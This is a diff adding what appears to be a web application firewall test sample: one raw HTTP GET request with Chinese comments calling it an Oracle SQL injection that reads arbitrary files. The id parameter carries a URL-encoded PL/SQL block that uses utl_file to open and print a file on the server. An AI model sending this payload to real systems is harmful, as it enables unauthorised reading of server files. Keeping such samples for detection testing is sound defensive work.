@@ -1,0 +1,9 @@
+# SQL注入_GET_oracle_读取文件
+# 攻击者通过构造此sql语句，使用utl_file包来读取文件操作，达到读取任意文件的目的。
+GET /?id=declare%20isto_file%20utl_file.file_type%3Bfp_buffer%20varchar2%284000%29%3Bbegin%20isto_file%20:=%20utl_file.fopen%28%27IST0_DIR%27%2C%20%27kj021320.jsp%27%2C%20%27R%27%29%3Butl_file.get_line%28isto_file%2C%20fp_buffer%29%3Bdbms_output.put_line%28fp_buffer%29%3Butl_file.fclose%28isto_file%29%3Bend%3B&bid=hd_tag_m8mv26gt HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26gt
+RM-PRO-Token: 838ff4cc1e455f372c0d92af025b6070
+RM-PRO-Time: 1742808618483
+User-Agent: curl/7.83.1
+
